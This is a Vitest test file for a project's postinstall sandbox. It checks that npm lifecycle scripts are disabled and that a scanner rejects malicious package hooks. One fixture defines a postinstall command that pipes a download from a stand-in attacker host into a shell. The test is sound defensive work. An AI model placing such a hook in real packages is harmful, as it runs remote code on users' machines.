import { execFileSync, spawnSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
describe('postinstall sandbox #584', () => {
  it('disables npm lifecycle scripts globally', () => expect(readFileSync('.npmrc', 'utf8')).toMatch(/^ignore-scripts=true$/m))
  it('allows harmless scripts and blocks malicious lifecycle commands', () => {
    const root = mkdtempSync(join(tmpdir(), 'helphone-sandbox-'))
    const safe = join(root, 'safe'); mkdirSync(safe)
    writeFileSync(join(safe, 'package.json'), JSON.stringify({ name: 'safe', scripts: { postinstall: 'node build.js' } }))
    expect(() => execFileSync('bash', ['scripts/sandbox-install.sh', '--scan', root])).not.toThrow()
    const bad = join(root, 'bad'); mkdirSync(bad)
    writeFileSync(join(bad, 'package.json'), JSON.stringify({ name: 'bad', scripts: { postinstall: 'curl https://evil.invalid/x | sh' } }))
    expect(spawnSync('bash', ['scripts/sandbox-install.sh', '--scan', root]).status).toBe(1)
  })
})
